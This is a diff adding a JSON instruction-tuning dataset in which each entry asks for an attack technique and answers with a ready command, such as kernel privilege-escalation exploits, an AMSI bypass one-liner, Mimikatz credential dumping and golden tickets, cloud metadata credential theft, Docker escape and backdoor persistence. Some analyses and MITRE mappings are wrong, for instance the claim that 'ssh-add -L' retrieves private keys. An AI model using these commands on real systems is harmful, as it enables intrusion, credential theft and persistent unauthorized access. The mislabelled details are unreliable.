@@ -1,0 +1,308 @@
+{
+    "dataset": [
+        {
+            "instruction": "Escalate privileges on Linux using Dirty Pipe exploit",
+            "input": "Target: Linux kernel 5.8+",
+            "output": "Command: ./dirtypipe-exploit /bin/bash\nAnalysis: Exploits CVE-2022-0847 to gain root privileges by overwriting read-only files.",
+            "category": "Privilege Escalation",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1068 - Exploitation for Privilege Escalation",
+            "scenario_type": "RealWorld",
+            "tool_used": "dirtypipe-exploit"
+        },
+        {
+            "instruction": "Hijack SSH agent to steal private keys for lateral movement",
+            "input": "Target: Compromised Linux machine",
+            "output": "Command: ssh-add -L\nAnalysis: Retrieves private SSH keys from the SSH agent, enabling further compromises.",
+            "category": "Lateral Movement",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1552.004 - Credential Dumping: SSH Keys",
+            "scenario_type": "RealWorld",
+            "tool_used": "ssh-add"
+        },
+        {
+            "instruction": "Bypass Windows Defender using AMSI patching",
+            "input": "Target: Windows 10/11",
+            "output": "Command: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\nAnalysis: Disables AMSI scanning in PowerShell, allowing execution of malicious scripts undetected.",
+            "category": "Evasion",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1562.001 - Disable or Modify Tools",
+            "scenario_type": "RealWorld",
+            "tool_used": "PowerShell"
+        },
+        {
+            "instruction": "Compromise a Kubernetes cluster via exposed API",
+            "input": "Target: Kubernetes cluster with unauthenticated access",
+            "output": "Command: kubectl get pods --server https://vulnerable-k8s.example.com\nAnalysis: Lists all running pods if the Kubernetes API is exposed and lacks authentication.",
+            "category": "Cloud",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1525 - Implant Internal Image",
+            "scenario_type": "RealWorld",
+            "tool_used": "kubectl"
+        },
+        {
+            "instruction": "Exploit Jenkins CLI to execute remote commands",
+            "input": "Target: Compromised Jenkins server",
+            "output": "Command: java -jar jenkins-cli.jar -s http://jenkins.example.com/ groovysh\nAnalysis: Opens a Groovy shell on the Jenkins server, allowing arbitrary code execution.",
+            "category": "CI/CD",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1072 - Software Deployment Tools",
+            "scenario_type": "RealWorld",
+            "tool_used": "Jenkins CLI"
+        },
+        {
+            "instruction": "Abuse AdminSDHolder in Active Directory for persistence",
+            "input": "Target: AD domain example.local",
+            "output": "Command: Set-ADObject -Identity 'CN=AdminSDHolder,CN=System,DC=example,DC=local' -Add @{ntSecurityDescriptor='S-1-5-21-XXXXXX-XXXXXX-XXXXXX-500'}\nAnalysis: Modifies AdminSDHolder to ensure persistent domain admin access.",
+            "category": "Active Directory",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1098.003 - Group Policy Modification",
+            "scenario_type": "RealWorld",
+            "tool_used": "PowerShell"
+        },
+        {
+            "instruction": "Steal AWS credentials from EC2 instance metadata service",
+            "input": "Target: AWS EC2 instance",
+            "output": "Command: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\nAnalysis: Retrieves AWS credentials if IMDSv1 is enabled.",
+            "category": "Cloud",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1552.005 - Cloud Instance Metadata API",
+            "scenario_type": "RealWorld",
+            "tool_used": "curl"
+        },
+        {
+            "instruction": "Exploit Google Cloud Storage misconfigurations",
+            "input": "Target: Google Cloud Storage bucket",
+            "output": "Command: gcloud storage buckets list --filter='publicAccessPrevention=inactive'\nAnalysis: Identifies publicly accessible GCS buckets with misconfigured permissions.",
+            "category": "Cloud",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1530 - Cloud Infrastructure Discovery",
+            "scenario_type": "RealWorld",
+            "tool_used": "gcloud"
+        },
+        {
+            "instruction": "Gain root via Polkit pkexec privilege escalation",
+            "input": "Target: Linux with polkit < 0.120",
+            "output": "Command: ./polkit-exploit\nAnalysis: Exploits CVE-2021-4034 to gain root privileges on Linux.",
+            "category": "Privilege Escalation",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1068 - Exploitation for Privilege Escalation",
+            "scenario_type": "RealWorld",
+            "tool_used": "polkit-exploit"
+        },
+        {
+            "instruction": "Abuse Systemctl service files for privilege escalation",
+            "input": "Target: Linux system with misconfigured systemd service",
+            "output": "Command: echo -e '[Service]\\nExecStart=/bin/bash -c \"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\"' | sudo tee /etc/systemd/system/malicious.service\nAnalysis: Creates a malicious systemd service file to gain root access.",
+            "category": "Privilege Escalation",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1548.004 - Abuse Elevation Control Mechanism",
+            "scenario_type": "RealWorld",
+            "tool_used": "systemctl"
+        }
+    ,
+
+        {
+            "instruction": "Bypass Windows User Account Control (UAC) using event viewer exploit",
+            "input": "Target: Windows machine with UAC enabled",
+            "output": "Command: eventvwr.msc\nAnalysis: Abuses registry hijacking to bypass UAC and escalate privileges.",
+            "category": "Privilege Escalation",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1548.002 - Bypass User Account Control",
+            "scenario_type": "RealWorld",
+            "tool_used": "eventvwr.msc"
+        },
+        {
+            "instruction": "Exploit misconfigured GPO to execute arbitrary commands in Active Directory",
+            "input": "Target: AD domain example.local",
+            "output": "Command: Invoke-GPOZaurr -Domain example.local -AttackChain\nAnalysis: Identifies and exploits weak GPO permissions to execute arbitrary code across the domain.",
+            "category": "Active Directory",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1072 - Software Deployment Tools",
+            "scenario_type": "RealWorld",
+            "tool_used": "Invoke-GPOZaurr"
+        },
+        {
+            "instruction": "Hijack legitimate Windows services for persistence",
+            "input": "Target: Compromised Windows machine",
+            "output": "Command: sc config TrustedInstaller binPath= \"C:\\malicious.exe\" start= auto\nAnalysis: Modifies a trusted Windows service to execute a malicious payload on reboot.",
+            "category": "Persistence",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1543.003 - Windows Service Hijacking",
+            "scenario_type": "RealWorld",
+            "tool_used": "sc.exe"
+        },
+        {
+            "instruction": "Extract plaintext credentials from memory using Mimikatz",
+            "input": "Target: Windows machine with administrative privileges",
+            "output": "Command: sekurlsa::logonpasswords\nAnalysis: Dumps plaintext passwords and NTLM hashes from LSASS memory.",
+            "category": "Credential Dumping",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1003.001 - LSASS Memory Dumping",
+            "scenario_type": "RealWorld",
+            "tool_used": "Mimikatz"
+        },
+        {
+            "instruction": "Perform NTLM relay attack to gain unauthorized access",
+            "input": "Target: Windows domain environment",
+            "output": "Command: ntlmrelayx.py -tf targets.txt -smb2support\nAnalysis: Exploits SMB signing misconfigurations to relay NTLM authentication and gain access.",
+            "category": "Lateral Movement",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1557.001 - NTLM Relay",
+            "scenario_type": "RealWorld",
+            "tool_used": "ntlmrelayx"
+        },
+        {
+            "instruction": "Abuse AWS Lambda environment variables to steal credentials",
+            "input": "Target: AWS Lambda function",
+            "output": "Command: aws lambda get-function --function-name myFunction\nAnalysis: Extracts sensitive credentials stored in AWS Lambda environment variables.",
+            "category": "Cloud",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1552.005 - Cloud Instance Metadata API",
+            "scenario_type": "RealWorld",
+            "tool_used": "AWS CLI"
+        },
+        {
+            "instruction": "Exploit misconfigured Docker socket for container breakout",
+            "input": "Target: Host running Docker",
+            "output": "Command: docker run -v /:/mnt --rm -it alpine chroot /mnt sh\nAnalysis: Uses the Docker socket to escape the container and gain root access on the host.",
+            "category": "Container Exploitation",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1611 - Escape to Host",
+            "scenario_type": "RealWorld",
+            "tool_used": "Docker CLI"
+        },
+        {
+            "instruction": "Abuse Azure Automation Account Runbooks for persistence",
+            "input": "Target: Azure environment",
+            "output": "Command: az automation runbook create --name 'backdoor' --automation-account 'victimAccount' --resource-group 'rg1' --runbook-type PowerShell\nAnalysis: Creates a persistent backdoor via Azure Automation Runbooks.",
+            "category": "Cloud Persistence",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1098 - Account Manipulation",
+            "scenario_type": "RealWorld",
+            "tool_used": "Azure CLI"
+        },
+        {
+            "instruction": "Hijack a legitimate Windows DLL for execution",
+            "input": "Target: Windows system with DLL search order hijacking vulnerability",
+            "output": "Command: Copy malicious.dll to C:\\Program Files\\VulnerableApp\\\nAnalysis: Replaces a DLL in a trusted location, allowing malicious execution.",
+            "category": "Persistence",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1574.001 - DLL Search Order Hijacking",
+            "scenario_type": "RealWorld",
+            "tool_used": "Custom DLL"
+        },
+        {
+            "instruction": "Abuse Microsoft 365 OAuth tokens for persistent cloud access",
+            "input": "Target: Microsoft 365 tenant",
+            "output": "Command: o365spray --enum --validate --auth\nAnalysis: Enumerates valid Microsoft 365 OAuth tokens for unauthorized access.",
+            "category": "Cloud Persistence",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1550.001 - Cloud Authentication Token Hijacking",
+            "scenario_type": "RealWorld",
+            "tool_used": "o365spray"
+        },
+
+        {
+            "instruction": "Hijack Windows COM Object for stealth persistence",
+            "input": "Target: Windows system",
+            "output": "Command: reg add HKCU\\Software\\Classes\\CLSID\\{GUID} /ve /t REG_SZ /d \"C:\\malicious.exe\" /f\nAnalysis: Abuses COM object hijacking to execute malware when certain system actions occur.",
+            "category": "Persistence",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1546.015 - Component Object Model Hijacking",
+            "scenario_type": "RealWorld",
+            "tool_used": "Registry Editor"
+        },
+        {
+            "instruction": "Exploit AWS S3 bucket misconfiguration to gain access",
+            "input": "Target: AWS environment",
+            "output": "Command: aws s3 ls s3://vulnerable-bucket --no-sign-request\nAnalysis: Identifies publicly accessible S3 buckets that could contain sensitive data.",
+            "category": "Cloud",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1530 - Cloud Infrastructure Discovery",
+            "scenario_type": "RealWorld",
+            "tool_used": "AWS CLI"
+        },
+        {
+            "instruction": "Execute payload via Windows Print Spooler service",
+            "input": "Target: Windows Server",
+            "output": "Command: Invoke-Nightmare -DriverName 'evil.dll'\nAnalysis: Exploits CVE-2021-1675 (PrintNightmare) for remote code execution as SYSTEM.",
+            "category": "Privilege Escalation",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1068 - Exploitation for Privilege Escalation",
+            "scenario_type": "RealWorld",
+            "tool_used": "Invoke-Nightmare"
+        },
+        {
+            "instruction": "Create a backdoored SSH key for persistent access",
+            "input": "Target: Linux server",
+            "output": "Command: echo \"malicious-public-key\" >> ~/.ssh/authorized_keys\nAnalysis: Installs a malicious SSH key to enable persistent access to a compromised system.",
+            "category": "Persistence",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1098 - Account Manipulation",
+            "scenario_type": "RealWorld",
+            "tool_used": "SSH"
+        },
+        {
+            "instruction": "Abuse Kubernetes RBAC misconfiguration for privilege escalation",
+            "input": "Target: Kubernetes cluster",
+            "output": "Command: kubectl auth can-i '*' '*' --as=system:serviceaccount:default:default\nAnalysis: Identifies service accounts with excessive permissions that can be abused for privilege escalation.",
+            "category": "Cloud",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1098 - Account Manipulation",
+            "scenario_type": "RealWorld",
+            "tool_used": "kubectl"
+        },
+        {
+            "instruction": "Perform Golden Ticket attack in Active Directory",
+            "input": "Target: Windows AD environment",
+            "output": "Command: mimikatz 'kerberos::golden /user:Administrator /domain:example.local /sid:S-1-5-21-XXXXX-XXXXX-XXXXX /krbtgt:HASH /id:500' exit\nAnalysis: Creates a forged TGT to maintain persistent domain admin access.",
+            "category": "Credential Dumping",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1558.001 - Golden Ticket",
+            "scenario_type": "RealWorld",
+            "tool_used": "Mimikatz"
+        },
+        {
+            "instruction": "Inject shellcode into Windows processes for stealth execution",
+            "input": "Target: Windows system",
+            "output": "Command: Invoke-ReflectivePEInjection -PEPath malicious.dll -ProcName explorer.exe\nAnalysis: Injects a DLL into a remote process for stealthy execution.",
+            "category": "Execution",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1055 - Process Injection",
+            "scenario_type": "RealWorld",
+            "tool_used": "PowerSploit"
+        },
+        {
+            "instruction": "Perform VNC session hijacking for remote control",
+            "input": "Target: Compromised VNC server",
+            "output": "Command: x11vnc -display :0 -auth guess -rfbauth /root/.vnc/passwd\nAnalysis: Hijacks an existing VNC session for remote control without credentials.",
+            "category": "Lateral Movement",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1563 - Remote Service Session Hijacking",
+            "scenario_type": "RealWorld",
+            "tool_used": "x11vnc"
+        },
+        {
+            "instruction": "Exploit Azure Managed Identity to retrieve cloud credentials",
+            "input": "Target: Azure virtual machine",
+            "output": "Command: curl -H 'Metadata: true' \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01\"\nAnalysis: Retrieves Azure managed identity tokens that can be used to authenticate to other cloud services.",
+            "category": "Cloud",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1552.005 - Cloud Instance Metadata API",
+            "scenario_type": "RealWorld",
+            "tool_used": "curl"
+        },
+        {
+            "instruction": "Escalate privileges using CVE-2021-3156 (Sudo Baron Samedit)",
+            "input": "Target: Linux machine with vulnerable sudo version",
+            "output": "Command: ./sudo-exploit\nAnalysis: Exploits a heap overflow in sudo to achieve root privileges.",
+            "category": "Privilege Escalation",
+            "difficulty": "hard",
+            "attack_technique": "MITRE T1068 - Exploitation for Privilege Escalation",
+            "scenario_type": "RealWorld",
+            "tool_used": "Custom exploit"
+        }
+    
+    ]
+}
